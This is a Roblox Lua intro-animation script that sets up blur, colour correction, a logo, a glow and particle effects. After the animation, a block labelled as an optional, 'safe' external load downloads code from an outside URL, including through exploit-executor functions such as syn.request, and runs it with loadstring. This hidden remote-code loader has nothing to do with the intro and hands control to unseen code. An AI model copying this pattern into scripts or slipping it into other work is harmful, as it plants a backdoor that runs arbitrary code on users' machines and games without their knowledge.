local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ContentProvider = game:GetService("ContentProvider")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Preload assets to prevent lag when they first appear
local assetsToPreload = {
    "rbxassetid://76109077411071", -- Logo image
    "rbxassetid://48965808",       -- Glow texture
    "rbxassetid://8995986695"      -- Optional particle texture
}

ContentProvider:PreloadAsync(assetsToPreload)

-- Enhanced blur effect with color correction
local blur = Instance.new("BlurEffect")
blur.Name = "IntroBlurEffect"
blur.Size = 0

local colorCorrection = Instance.new("ColorCorrectionEffect")
colorCorrection.Name = "IntroColorCorrection"
colorCorrection.Contrast = 0.1
colorCorrection.Saturation = -0.1
colorCorrection.Brightness = 0.05
colorCorrection.TintColor = Color3.fromRGB(255, 240, 230)

local effectsFolder = Instance.new("Folder")
effectsFolder.Name = "IntroEffects"
blur.Parent = effectsFolder
colorCorrection.Parent = effectsFolder
effectsFolder.Parent = game:GetService("Lighting")

-- Dynamic blur pulse effect
task.spawn(function()
    local grow = true
    while blur.Parent do
        local size = grow and 24 or 20
        TweenService:Create(blur, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = size}):Play()
        
        -- Slightly adjust color correction during pulse
        if grow then
            TweenService:Create(colorCorrection, TweenInfo.new(1.5), {
                Contrast = 0.15,
                Brightness = 0.08
            }):Play()
        else
            TweenService:Create(colorCorrection, TweenInfo.new(1.5), {
                Contrast = 0.1,
                Brightness = 0.05
            }):Play()
        end
        
        grow = not grow
        task.wait(1.5)
    end
end)

-- Create ScreenGui with fullscreen coverage
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "IntroGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.DisplayOrder = 999  -- Ensure it's on top
screenGui.IgnoreGuiInset = true  -- Cover the whole screen including device bezels
screenGui.Parent = playerGui

-- Create fullscreen container
local container = Instance.new("Frame")
container.Name = "Container"
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.Size = UDim2.new(1, 0, 1, 0)  -- Full screen coverage
container.BackgroundTransparency = 1
container.Parent = screenGui

-- Fullscreen dark overlay with edge-to-edge coverage
local overlay = Instance.new("Frame")
overlay.Name = "Overlay"
overlay.AnchorPoint = Vector2.new(0.5, 0.5)
overlay.Position = UDim2.new(0.5, 0, 0.5, 0)
overlay.Size = UDim2.new(1, 0, 1, 0)  -- Full screen
overlay.BackgroundColor3 = Color3.new(0, 0, 0)
overlay.BackgroundTransparency = 0.7
overlay.ZIndex = 1
overlay.Parent = container

-- Enhanced logo with multiple effects
local logo = Instance.new("ImageLabel")
logo.Name = "Logo"
logo.AnchorPoint = Vector2.new(0.5, 0.5)
logo.Position = UDim2.new(0.5, 0, 0.5, 0)
logo.Size = UDim2.new(0, 0, 0, 0)
logo.BackgroundTransparency = 1
logo.Image = "rbxassetid://76109077411071"
logo.ImageTransparency = 1
logo.ScaleType = Enum.ScaleType.Fit
logo.ZIndex = 2
logo.Parent = container

-- Animated border effect
local stroke = Instance.new("UIStroke")
stroke.Name = "AnimatedStroke"
stroke.Thickness = 4
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Transparency = 1
stroke.LineJoinMode = Enum.LineJoinMode.Round
stroke.Parent = logo

-- Enhanced glow effect with particles
local glow = Instance.new("ImageLabel")
glow.Name = "GlowEffect"
glow.AnchorPoint = Vector2.new(0.5, 0.5)
glow.Position = UDim2.new(0.5, 0, 0.5, 0)
glow.Size = UDim2.new(1.5, 0, 1.5, 0)
glow.BackgroundTransparency = 1
glow.Image = "rbxassetid://48965808"
glow.ImageTransparency = 1
glow.ZIndex = 1
glow.Parent = logo

-- Particle effect for extra sparkle
local particles = Instance.new("Frame")
particles.Name = "Particles"
particles.Size = UDim2.new(1, 0, 1, 0)
particles.BackgroundTransparency = 1
particles.ZIndex = 3
particles.Parent = logo

local particleTemplate = Instance.new("ImageLabel")
particleTemplate.Name = "ParticleTemplate"
particleTemplate.Size = UDim2.new(0, 16, 0, 16)
particleTemplate.BackgroundTransparency = 1
particleTemplate.Image = "rbxassetid://8995986695"
particleTemplate.ImageTransparency = 0.8
particleTemplate.AnchorPoint = Vector2.new(0.5, 0.5)
particleTemplate.ZIndex = 3

-- Animation sequence
local function animateIn()
    -- Fade in overlay and blur
    TweenService:Create(overlay, TweenInfo.new(0.5), {BackgroundTransparency = 0.5}):Play()
    TweenService:Create(blur, TweenInfo.new(1), {Size = 20}):Play()
    TweenService:Create(colorCorrection, TweenInfo.new(1), {Contrast = 0.1}):Play()
    
    task.wait(0.5)
    
    -- Logo entrance animation
    local tweenIn = TweenService:Create(logo, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 300, 0, 300),
        ImageTransparency = 0
    })
    tweenIn:Play()
    
    -- Stroke and glow effects
    TweenService:Create(stroke, TweenInfo.new(1.5), {
        Transparency = 0,
        Thickness = 6  -- Slight grow effect
    }):Play()
    
    TweenService:Create(glow, TweenInfo.new(1.5), {
        ImageTransparency = 0.6,
        Size = UDim2.new(1.8, 0, 1.8, 0)
    }):Play()
    
    -- Particle spawner
    task.spawn(function()
        for i = 1, 15 do
            local particle = particleTemplate:Clone()
            particle.Position = UDim2.new(0.5, 0, 0.5, 0)
            particle.Rotation = math.random(0, 360)
            particle.Size = UDim2.new(0, 0, 0, 0)
            particle.ImageColor3 = Color3.fromHSV(math.random(), 0.8, 1)
            particle.Parent = particles
            
            local angle = math.rad(math.random(0, 360))
            local distance = math.random(80, 150)
            local endPos = UDim2.new(
                0.5, math.cos(angle) * distance,
                0.5, math.sin(angle) * distance
            )
            
            TweenService:Create(particle, TweenInfo.new(0.5), {
                Size = UDim2.new(0, math.random(10, 20), 0, math.random(10, 20)),
                Position = endPos
            }):Play()
            
            task.wait(0.1)
        end
    end)
    
    -- Continuous glow rotation
    task.spawn(function()
        while glow.Parent do
            glow.Rotation = 0
            local rotateTween = TweenService:Create(glow, TweenInfo.new(12, Enum.EasingStyle.Linear), {Rotation = 360})
            rotateTween:Play()
            rotateTween.Completed:Wait()
        end
    end)
end

local function animateOut()
    -- Fade out all elements
    TweenService:Create(overlay, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
    TweenService:Create(logo, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
        ImageTransparency = 1,
        Size = UDim2.new(0, 350, 0, 350)
    }):Play()
    
    TweenService:Create(stroke, TweenInfo.new(0.8), {
        Transparency = 1,
        Thickness = 10
    }):Play()
    
    TweenService:Create(glow, TweenInfo.new(0.8), {
        ImageTransparency = 1,
        Size = UDim2.new(2, 0, 2, 0)
    }):Play()
    
    -- Fade out particles
    for _, particle in ipairs(particles:GetChildren()) do
        if particle:IsA("ImageLabel") then
            TweenService:Create(particle, TweenInfo.new(0.5), {
                ImageTransparency = 1,
                Size = UDim2.new(0, 0, 0, 0)
            }):Play()
        end
    end
    
    -- Remove effects
    TweenService:Create(blur, TweenInfo.new(1), {Size = 0}):Play()
    TweenService:Create(colorCorrection, TweenInfo.new(1), {Contrast = 0}):Play()
    
    task.wait(1)
    
    -- Cleanup
    effectsFolder:Destroy()
    screenGui:Destroy()
end

-- Run animation sequence
animateIn()

-- Wait for duration (can be made configurable)
task.wait(4)  -- Increased display time

animateOut()

-- Optional: Load external script (safely)
do
    local url = "https://cdn.authguard.org/virtual-file/1aceaf9e290f4982b7ebe1b5cf2dbce6"
    local ok, body = pcall(function()
        if game.HttpGetAsync then
            return game:HttpGetAsync(url)
        elseif game.HttpGet then
            return game:HttpGet(url)
        elseif syn and syn.request then
            return syn.request({ Url = url, Method = "GET" }).Body
        else
            error("No HTTP function available")
        end
    end)

    if not ok or not body or body == "" then
        warn("External script download failed:", tostring(body))
        return
    end

    local fnOk, fn = pcall(loadstring, body)
    if not fnOk or type(fn) ~= "function" then
        warn("External script loadstring failed:", fn)
        return
    end

    local execOk, execErr = pcall(fn)
    if not execOk then
        warn("External script execution failed:", execErr)
    end
end
